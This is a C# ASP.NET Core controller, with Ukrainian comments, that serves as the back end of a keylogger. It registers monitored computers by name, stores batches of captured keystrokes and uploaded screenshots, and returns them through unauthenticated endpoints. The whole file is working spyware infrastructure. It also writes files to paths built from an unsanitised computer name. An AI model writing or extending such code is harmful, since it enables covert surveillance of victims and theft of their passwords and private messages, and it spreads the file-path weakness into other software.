using ListenerDatabase; // Простір імен для AppDbContext
using ListenerDatabase.Models; // Простір імен для моделей User, KeyLog, Screenshot
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using System.IO;
using System.Threading.Tasks;
using System.Linq;
using System;

namespace ListenerServer
{
    [ApiController]
    [Route("api")]
    public class DataController : ControllerBase
    {
        private readonly AppDbContext _context;

        public DataController(AppDbContext context)
        {
            _context = context;
        }

        [HttpPost("register-computer")]
        public async Task<IActionResult> RegisterComputer(string computerName)
        {
            var user = await _context.Users.FirstOrDefaultAsync(u => u.ComputerName == computerName);
            if (user == null)
            {
                user = new User { ComputerName = computerName };
                _context.Users.Add(user);
                await _context.SaveChangesAsync();
            }

            return Ok(new { UserId = user.UserId });
        }

        [HttpPost("save-keypresses")]
        public async Task<IActionResult> SaveKeyPresses([FromBody] KeyPressBatchRequest request)
        {
            var user = await _context.Users.FirstOrDefaultAsync(u => u.ComputerName == request.ComputerName);
            if (user == null)
                return BadRequest("Користувач не зареєстрований.");

            var keyLogs = request.KeyPresses.Select(key => new KeyLog
            {
                KeyPressed = key,
                Timestamp = DateTime.Now,
                UserId = user.UserId
            }).ToList();

            _context.KeyLogs.AddRange(keyLogs);
            await _context.SaveChangesAsync();

            return Ok("Клавіші збережено.");
        }

        // Клас для запиту
        public class KeyPressBatchRequest
        {
            public string ComputerName { get; set; }
            public List<string> KeyPresses { get; set; }
        }

        [HttpPost("save-screenshot")]
        public async Task<IActionResult> SaveScreenshot([FromForm] string computerName, [FromForm] IFormFile screenshotFile)
        {
            // Перевіряємо, чи існує користувач
            var user = await _context.Users.FirstOrDefaultAsync(u => u.ComputerName == computerName);
            if (user == null)
                return BadRequest("Користувач не зареєстрований.");

            // Генеруємо унікальний шлях для збереження файлу
            string screenshotsDirectory = Path.Combine("Screenshots", computerName);
            Directory.CreateDirectory(screenshotsDirectory);

            string uniqueFileName = $"{Guid.NewGuid()}.jpg";
            string relativeFilePath = Path.Combine(computerName, uniqueFileName); // Без "Screenshots"
            string filePath = Path.Combine(screenshotsDirectory, uniqueFileName); // Повний шлях для збереження файлу

            // Зберігаємо файл у файлову систему
            using (var fileStream = new FileStream(filePath, FileMode.Create))
            {
                await screenshotFile.CopyToAsync(fileStream);
            }

            // Зберігаємо **відносний** шлях до файлу в базу даних
            var screenshot = new Screenshot
            {
                FilePath = relativeFilePath, // Наприклад, "IHORNOTEBOOK/1901...jpg"
                Timestamp = DateTime.Now,
                UserId = user.UserId
            };


            _context.Screenshots.Add(screenshot);
            await _context.SaveChangesAsync();

            return Ok("Скріншот збережений.");
        }

        [HttpGet("get-keypresses")]
        public async Task<IActionResult> GetKeyPresses(int userId)
        {
            var user = await _context.Users.Include(u => u.KeyLogs).FirstOrDefaultAsync(u => u.UserId == userId);
            if (user == null)
                return NotFound("Користувач не знайдений.");

            var keyLogs = user.KeyLogs.Select(k => new
            {
                k.Timestamp,
                k.KeyPressed
            });

            return Ok(keyLogs);
        }

        [HttpGet("get-screenshots")]
        public async Task<IActionResult> GetScreenshots(int userId)
        {
            var user = await _context.Users.Include(u => u.Screenshots).FirstOrDefaultAsync(u => u.UserId == userId);
            if (user == null)
                return NotFound("Користувач не знайдений.");

            var baseUrl = $"{Request.Scheme}://{Request.Host}/Screenshots";

            var screenshots = user.Screenshots
                .Select(s => new
                {
                    s.Timestamp,
                    FileUrl = $"{baseUrl}/{s.FilePath.Replace("\\", "/")}" // Формуємо абсолютний URL
                });

            return Ok(screenshots);
        }
    }
}
